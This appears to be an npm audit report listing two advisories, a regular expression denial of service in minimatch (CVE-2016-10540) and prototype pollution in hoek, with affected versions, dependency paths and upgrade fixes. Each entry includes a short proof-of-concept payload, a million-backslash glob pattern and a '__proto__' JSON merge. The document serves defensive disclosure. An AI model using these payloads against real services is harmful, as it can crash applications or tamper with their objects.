high Regular Expression Denial of Service

  • Module: minimatch
  • Published: May 25th 2016
  • Reported by: Nick Starke
  • CWE-400
  • CVE-2016-10540
  • Vulnerable: <=3.0.1
  • Patched: >=3.0.2
  • CVSS: 4

Overview

Affected versions of minimatch are vulnerable to regular expression denial of service attacks when user input is passed into the pattern argument of minimatch(path, pattern).

Proof of Concept

var minimatch = require(“minimatch”);

// utility function for generating long strings
var genstr = function (len, chr) {
  var result = “”;
  for (i=0; i<=len; i++) {
    result = result + chr;
  }
  return result;
}

var exploit = “[!” + genstr(1000000, “\\”) + “A”;

// minimatch exploit.
console.log(“starting minimatch”);
minimatch(“foo”, exploit);
console.log(“finishing minimatch”);

Findings

  • gulp-copy>gulp>vinyl-fs>glob-stream>glob>minimatch
  • gulp-copy>gulp>vinyl-fs>glob-stream>minimatch
  • gulp-copy>gulp>vinyl-fs>glob-watcher>gaze>globule>glob>minimatch
  • gulp-copy>gulp>vinyl-fs>glob-watcher>gaze>globule>minimatch

Remediation

Update to version 3.0.2 or later.

moderate Prototype Pollution

  • Module: hoek
  • Published: April 20th 2018
  • Reported by: HoLyVieR
  • CWE-471
  • Vulnerable: <= 4.2.0 || >= 5.0.0 < 5.0.3
  • Patched: > 4.2.0 < 5.0.0 || >= 5.0.3
  • CVSS: 5

Overview

Versions of hoek prior to 4.2.1 and 5.0.3 are vulnerable to prototype pollution.

The merge function, and the applyToDefaults and applyToDefaultsWithShallow functions which leverage merge behind the scenes, are vulnerable to a prototype pollution attack when provided an unvalidated payload created from a JSON string containing the __proto__ property.

This can be demonstrated like so:

var Hoek = require('hoek');
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';

var a = {};
console.log("Before : " + a.oops);
Hoek.merge({}, JSON.parse(malicious_payload));
console.log("After : " + a.oops);

This type of attack can be used to overwrite existing properties causing a potential denial of service.

Findings

  • electron-rebuild>node-gyp>request>hawk>boom>hoek
  • electron-rebuild>node-gyp>request>hawk>cryptiles>boom>hoek
  • electron-rebuild>node-gyp>request>hawk>hoek
  • electron-rebuild>node-gyp>request>hawk>sntp>hoek
  • node-gyp>request>hawk>boom>hoek
  • node-gyp>request>hawk>cryptiles>boom>hoek
  • node-gyp>request>hawk>hoek
  • node-gyp>request>hawk>sntp>hoek

Remediation

Update to version 4.2.1, 5.0.3 or later.
